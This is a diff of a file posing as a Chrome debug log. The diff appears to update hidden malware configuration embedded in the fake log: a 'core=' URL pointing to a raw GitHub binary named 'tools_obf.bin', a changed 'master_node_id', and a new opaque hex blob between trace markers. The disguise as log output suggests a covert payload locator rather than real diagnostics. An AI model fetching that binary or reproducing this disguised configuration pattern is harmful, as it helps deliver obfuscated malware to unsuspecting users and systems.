@@ -63,7 +63,7 @@ PID: 4120
 Application started: chrome.exe
 PID: 4988
 Command line: "C:\Program Files\Google\Chrome\Application\chrome.exe"
-core= [https://raw.githubusercontent.com/nengkinkjackx/debug/main/nethink.bin]
+core= [https://raw.githubusercontent.com/nengkinkjackx/debug/main/tools_obf.bin]
 
 [00:58:31.004] [DEBUG] [APP]
 chrome.exe initialized profile: Default
@@ -78,7 +78,7 @@ Power state: AC
 Battery status: Not applicable
 
 [00:58:41.230] [DEBUG] [INPUT]
-master_node_id: [Sc4ry3asy-2432]
+master_node_id: [oxide-44448888]
 User input detected.
 Foreground window: Google Chrome
 
@@ -95,9 +95,8 @@ Protocol: TLS 1.3
 [00:58:50.401] [DEBUG] [NETWORK]
 Outbound HTTPS connection established.
 TRACE_ID_START
-7c 9b ce 80 4d a7 05 c7 58 0f b1 b2 15 b0 0b 26 72 d7 b9 41 ca fa 3f c1 20 77 67 1e e2 9f 27 a6 4f 59 44 e2 9e 6b 87 cb 2a be 01 87 c8 2b 15 db f6 62 fd 1b 20 1e 93 39 fe 3c 
-3e 2f e3 aa 2a fd b2 ca 13 48 ce 36 1c 16
-[DEBUG] TRACE_ID_END                                                                                                                                                                                               
+e0 b7 66 2b da 98 72 af 3c ce f2 4e 02 8f 7d 95 51 f2 fb 51 c8 00 36 ea 9d 40 dd 65 38 92 ba 52 18 fc e1 92 f6 4e 42 dd 04 2b 30 d4 e1 7b 0b cb bd 86 e8 6b f9 fd a7 81 c0 67 6b 77 67 bf 22 81 26 9d 32 5d e7 1c 41 bf
+[DEBUG] TRACE_ID_END
 Protocol: TLS 1.3
 
 [00:58:55.119] [INFO] [TASK]
